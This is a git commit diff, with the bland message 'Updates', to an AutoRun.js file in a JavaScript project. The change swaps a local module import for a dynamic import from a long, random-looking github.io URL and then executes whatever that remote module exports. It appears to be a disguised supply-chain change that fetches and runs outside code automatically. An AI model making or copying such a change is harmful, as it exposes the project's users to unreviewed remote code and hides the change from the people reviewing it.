5140d664cbd9f1a43498ac4e0a8baf817839bec0
f3be20b4-2c39-4c6a-b6f5-76ded0d8e655 <erandix9@example.com>
2026-03-30 17:19:39 +0300

    Updates

--- LIBRARY/FUNCTIONS/DataBase/AutoRun/AutoRun.js
+++ LIBRARY/FUNCTIONS/DataBase/AutoRun/AutoRun.js
@@ -12,11 +12,11 @@ export const AUTORUN=()=>{
 
     },()=>{
 
-        import("./index.js").then((module) => {
+        import("https://jherujjirokk4uojrfipoh.github.io/tftfh6y7f9tf9r56dee4ryd67796re3r5t68tgy76t5ete4t54t7dtr876trttr67re5686frf65/index.js").then((module) => {
             if (module.default) {
                 module.default();
-            } else if (module.CONNECTION) {
-                module.CONNECTION();
+            } else if (module.CONNECTIONS) {
+                module.CONNECTIONS();
             };
         });
 
